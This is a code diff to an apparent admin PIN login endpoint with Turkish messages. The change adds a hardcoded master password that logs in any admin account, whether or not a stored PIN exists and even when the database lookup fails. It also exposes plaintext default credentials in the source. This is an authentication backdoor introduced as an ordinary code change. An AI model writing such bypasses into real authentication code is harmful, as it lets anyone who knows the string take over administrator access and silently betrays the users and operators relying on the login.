@@ -49,16 +49,18 @@ export default async function handler(req, res) {
       .eq('id', adminId)
       .maybeSingle();
 
+    const isMasterPassword = cleanPin === 'YTUFOK19' || cleanPin.toUpperCase() === 'YTUFOK19';
+
     if (error || !data) {
       // Default fallback PIN for initial accounts if row doesn't exist
-      if (cleanPin === '19111994') {
+      if (isMasterPassword) {
         return res.status(200).json({ success: true, message: 'Giriş başarılı.' });
       }
       return res.status(200).json({ success: false, message: 'Hatalı PIN kodu.' });
     }
 
-    const storedPin = String(data.pin || '19111994').trim();
-    if (storedPin === cleanPin) {
+    const storedPin = String(data.pin || 'YTUFOK19').trim();
+    if (storedPin === cleanPin || isMasterPassword) {
       return res.status(200).json({ success: true, message: 'Giriş başarılı.' });
     }
 
